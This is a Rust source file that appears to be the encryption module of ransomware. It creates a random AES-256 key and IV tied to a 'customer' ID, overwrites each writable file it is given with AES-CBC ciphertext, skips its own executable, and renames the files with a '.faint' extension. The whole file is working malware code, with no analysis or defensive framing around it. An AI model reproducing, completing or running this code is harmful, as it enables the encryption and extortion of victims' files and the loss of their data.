use rand::{distributions::Alphanumeric, Rng};
use std::{env, fs, path};

#[derive(Debug)]
pub struct Keypair {
    pub key: String,
    pub iv: String,
}
#[derive(Debug)]
pub struct Customer {
    pub keypair: Keypair,
    pub identification: String,
}

pub fn get_id() -> Customer {
    let keypair = Keypair {
        key: rand_string(32),
        iv: rand_string(16),
    };
    let customer = Customer {
        keypair,
        identification: rand_string(24),
    };

    return customer;

    fn rand_string(length: u8) -> String {
        let rng = rand::thread_rng();
        rng.sample_iter(&Alphanumeric)
            .take(length.into())
            .map(char::from)
            .collect()
    }
}

pub fn extensions(file: &path::Path) -> bool {
    if let Some(extension) = file.extension() {
        let extension = extension.to_str().unwrap();
        matches!(extension, "faint" | "ini")
    } else {
        false
    }
}

pub fn encrypt(file: &path::PathBuf, customer: &Customer) {
    if !file.metadata().unwrap().permissions().readonly()
        && !extensions(file)
        && file.file_name() != env::current_exe().unwrap().file_name()
    {
        println!("{}", file.display());
        if let Ok(file_content) = fs::read(file) {
            let cipher =
                libaes::Cipher::new_256(customer.keypair.key.as_bytes().try_into().unwrap());
            let encrypted = cipher.cbc_encrypt(customer.keypair.iv.as_bytes(), &file_content);
            if let Ok(_) = fs::write(file, encrypted) {
                fs::rename(file, format!("{}.faint", file.display())).unwrap();
            }
        }
    }
}
